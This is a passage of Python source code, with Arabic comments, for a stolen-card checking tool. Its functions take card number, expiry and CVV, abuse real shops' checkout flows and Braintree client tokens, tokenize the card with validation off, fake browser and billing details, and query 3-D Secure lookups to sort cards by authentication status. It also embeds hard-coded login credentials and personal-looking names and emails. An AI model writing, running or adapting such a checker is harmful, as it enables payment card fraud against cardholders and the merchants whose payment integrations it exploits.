	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv















def otps4(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())


	
	headers={
'User-Agent': user,
}

	rrr=r.get("https://casabalo.com/mio-account/add-payment-method/",headers=headers)
	login=findall(r'name="woocommerce-login-nonce" value="(.*?)"',rrr.text)[0]

	print(login)











	headers={
'User-Agent': user,
}
	data = {
	'username': 'sxdxxrpp@hi2.in',
	'password': '123bmS1234',
	'woocommerce-login-nonce': login,
	'_wp_http_referer': '/my-account/add-payment-method/',
	'login': 'Log in',
}

	response = r.post('https://casabalo.com/mio-account/add-payment-method/', headers=headers, data=data)



	headers={
'User-Agent': user,
}
 
	rr = r.get('https://casabalo.com/mio-account/add-payment-method/', headers=headers)


	aut=rr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]

	print(auth)


	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  # تحديد اللغة والمنطقة
	full_name = f"{fake.first_name()} {fake.last_name()}"

	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'authorization': f'Bearer {auth}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
	'clientSdkMetadata': {
		'source': 'client',
		'integration': 'custom',
		'sessionId': corr,
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
	'variables': {
		'input': {
			'creditCard': {
				'number': c,
				'expirationMonth': mm,
				'expirationYear': yy,
				'cvv': cvc,
				'billingAddress': {
					'postalCode': fake.zipcode(),
					'streetAddress': fake.street_address(),
				},
			},
			'options': {
				'validate': False,
			},
		},
	},
	'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)







	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)
	
	
	
	headers = {
		'user-agent': user,
	}


	json_data = {
		'amount': random_numbersss,
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'1_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'beardedcolonel.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}


	response = requests.post(
    f'https://api.braintreegateway.com/merchants/bhxnm4pmscyc69zw/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)




	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv













def otps5(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	binmod = c[:6]
	try:
		yy = ex[2] + ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			yy = ex[2] + '7'
		else:
			pass
	except:
		yy = ex[0] + ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			yy = ex[0] + '7'
		else:
			pass
	print(c,mm,yy,cvc)
	characters = string.ascii_uppercase + string.digits
	postal_code = ''.join(random.choices(characters, k=6))
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()
	import cloudscraper
	scraper = cloudscraper.create_scraper()
	import uuid

# توليد correlation_id عشوائي
	corr = str(uuid.uuid4())
	



	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/en-gb/hardside-travelling-luggage-large-coveri-world-trendy',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}


	# الطلب الأول
	response = r.get('https://optimist.si/', headers=headers)
	cookies = r.cookies


	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/en-gb/ladies-leather-jacket-gipsy-cacey',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'option[3287]': '9990',
    'quantity': '1',
    'product_id': '1582',
}

	response = r.post('https://optimist.si/index.php?route=checkout/cart/add', cookies=cookies, headers=headers, data=data)




	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/index.php?route=extension/quickcheckout/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'firstname': 'Hussain ',
    'lastname': 'Alfuraiji ',
    'company': '87',
    'custom_field[account][7]': '',
    'email': 'bmwiraqy1@gmail.com',
    'telephone': '31531531522',
    'customer_group_id': '9',
    'address_1': '500 main street ',
    'address_2': '',
    'city': 'Las Vegas',
    'postcode': '90001',
    'country_id': '240',
    'zone_id': '3964',
    'shipping_address': '1',
}

	response = r.post(
    'https://optimist.si/index.php?route=extension/quickcheckout/guest/validate',
    cookies=cookies,
    headers=headers,
    data=data,
)




	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/index.php?route=extension/quickcheckout/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'shipping_method': 'xshippingpro.xshippingpro2',
    'delivery_date': '',
    'delivery_time': '',
}

	response = r.post(
    'https://optimist.si/index.php?route=extension/quickcheckout/shipping_method/validate',
    cookies=cookies,
    headers=headers,
    data=data,
)

	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/index.php?route=extension/quickcheckout/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'payment_method': 'braintree',
    'survey': '',
    'comment': '',
}

	response = r.post(
    'https://optimist.si/index.php?route=extension/quickcheckout/payment_method/validate',
    cookies=cookies,
    headers=headers,
    data=data,
)



	headers = {
    'authority': 'optimist.si',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://optimist.si',
    'referer': 'https://optimist.si/index.php?route=extension/quickcheckout/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'agree': '1',
}

	response = r.post(
    'https://optimist.si/index.php?route=extension/quickcheckout/terms/validate',
    cookies=cookies,
    headers=headers,
    data=data,
)


	headers = {
    'authority': 'optimist.si',
    'accept': 'text/html, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://optimist.si/index.php?route=extension/quickcheckout/checkout',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	response = r.get(
    'https://optimist.si/index.php?route=extension/quickcheckout/confirm&_=1737379330755',
    cookies=cookies,
    headers=headers,
)



	import re
	import base64

# نص HTML المستخرج
	html_content = response.text

	# استخراج النص الخاص بـ authorization باستخدام regex
	pattern_authorization = re.compile(r"authorization:\s*'([^']*)'")  # يستهدف النص داخل authorization
	match_authorization = pattern_authorization.search(html_content)

	if match_authorization:
		encrypted_text = match_authorization.group(1)

		try:
			# فك تشفير النص باستخدام base64
			decoded_text = base64.b64decode(encrypted_text).decode('utf-8')

			# استخراج authorizationFingerprint من النص المفكوك
			auth_pattern = re.compile(r'"authorizationFingerprint":"(.*?)"')
			match_auth = auth_pattern.search(decoded_text)

			if match_auth:
				auth = match_auth.group(1)
				#return auth  # إرجاع fingerprint إذا وجد
			else:
				print("Authorization Fingerprint غير موجود في النص المفكوك.")
			#	return None
		except Exception as e:
			print("خطأ أثناء فك التشفير:", e)
			return None
	else:
		print("النص الخاص بـ authorization غير موجود.")
		return None




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '60bb30eb-d440-4a02-bb05-e5031366543c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok = response.json()['data']['tokenizeCreditCard']['token']

	import random
	from faker import Faker

# إنشاء كائن Faker
	fake = Faker('en_US')  
  # تعيين اللغة إلى العربية المصرية

# توليد بيانات وهمية





	def generate_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbers = generate_random_numbers()
	print(random_numbers)









	def generatess_random_numbers():
		numbers = f"{random.randint(400000, 599999):010d}"
		return numbers

# استدعاء الدالة
	random_numbersss = generatess_random_numbers()
	print(random_numbersss)





	r = requests.session()


	def generate_phone():
		numbers = f"{random.randint(1000000000, 9999999999):010d}"
		return numbers

# استدعاء الدالة
	phone_numbers = generate_phone()
	print(phone_numbers)

	import requests

	headers = {
	'authority': 'api.braintreegateway.com',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9',
	'content-type': 'application/json',
	'origin': 'https://optimist.si',
	'referer': 'https://optimist.si/',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': user,
}

	json_data = {
		'amount': '76.93',
		'browserColorDepth': 24,
		'browserJavaEnabled': False,
		'browserJavascriptEnabled': True,
		'browserLanguage': 'ar-EG',
		'browserScreenHeight': random.randint(600, 1080),  # ارتفاع الشاشة عشوائي
		'browserScreenWidth': random.randint(300, 1920),   # عرض الشاشة عشوائي
		'browserTimeZone': random.choice([-120, -60, 0, 60, 120]),  # المنطقة الزمنية عشوائية
		'deviceChannel': 'Browser',
		'additionalInfo': {
			'ipAddress': fake.ipv4(),  # توليد عنوان IP وهمي
			'billingLine1': fake.street_address(),  # عنوان الشحن الوهمي
			'billingLine2': '',
			'billingCity': fake.city(),  # المدينة الوهمية
			'billingState': fake.state_abbr(),  # الولاية الوهمية
			'billingPostalCode': fake.postcode(),  # الرمز البريدي الوهمي
			'billingCountryCode': fake.country_code(),  # رمز الدولة الوهمي
			'billingPhoneNumber': phone_numbers,  # بدون الأقواس
			'billingGivenName': fake.first_name(),  # الاسم الأول الوهمي
			'billingSurname': fake.last_name(),  # اسم العائلة الوهمي
			'email': email,
		},
		'bin': random_numbers,
		'dfReferenceId': f'{random_numbers}_{corr}',
		'clientMetadata': {
			'requestedThreeDSecureVersion': '3',
			'sdkVersion': 'web/3.106.0',
			'cardinalDeviceDataCollectionTimeElapsed': random.randint(100, 1000),  # عشوائي
			'issuerDeviceDataCollectionTimeElapsed': random.randint(1000, 5000),  # عشوائي
			'issuerDeviceDataCollectionResult': random.choice([True, False]),  # عشوائي
		},
		'authorizationFingerprint': str(auth),
		'braintreeLibraryVersion': 'braintree/web/3.106.0',
		'_meta': {
			'merchantAppId': 'www.woodbridgegreengrocers.co.uk',
			'platform': 'web',
			'sdkVersion': '3.106.0',
			'source': 'client',
			'integration': 'custom',
			'integrationType': 'custom',
			'sessionId': fake.uuid4(),  # معرف الجلسة الوهمي
		},
	}



	response = requests.post(
    f'https://api.braintreegateway.com/merchants/yrqh5n3fbbr4py3f/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)

	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	r.close()
	

	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
		return '3DS Authenticate Attempt Successful'
	elif 'authenticate_rejected' in vbv:
		return '3DS Authenticate Rejected'
	elif 'authenticate_frictionless_failed' in vbv:
		return '3DS Authenticate Frictionless Failed'
	elif 'lookup_card_error' in vbv:
		return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
		return 'Unknown Error ⚠️'
	return vbv




